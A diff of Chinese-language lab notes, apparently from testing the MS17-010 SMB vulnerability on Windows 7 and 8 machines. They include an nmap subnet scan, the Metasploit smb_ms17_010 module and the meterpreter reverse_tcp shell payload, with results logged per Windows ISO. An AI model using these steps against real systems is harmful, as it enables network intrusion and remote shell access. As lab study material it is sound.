@@ -1,6 +1,6 @@
 nmap 192.168.55.1-254   扫描网段 win7开防火墙 ping 不通   win8 开防火墙 能 ping 通
 
- zuomian  youjian  Applications->Settings->Settings Manager->Display keyi xiugai aoc xianshibuquanwenti 
+桌面 右键 Applications->Settings->Settings Manager->Display 可以修改 aoc 显示不全问题 
 
 msfconsole
 use  auxiliary/scanner/smb/smb_ms17_010
@@ -40,5 +40,5 @@ cn_windows_7_professional_with_sp1_x86_dvd_u_677162.iso  2011-05-12
 跟payload windows/meterpreter/reverse_tcp 都失败
 都显示 This module only supports x64 (64-bit) targets
 
-cn_windows_7_professional_with_sp1_x64_dvd_u_677031.iso    2011-05-12  set payload windows/meterpreter/reverse_tcp  meiyou lanping  danshi meidedaoshell
+cn_windows_7_professional_with_sp1_x64_dvd_u_677031.iso    2011-05-12  set payload windows/meterpreter/reverse_tcp 没有蓝屏但是没有得到shell
 
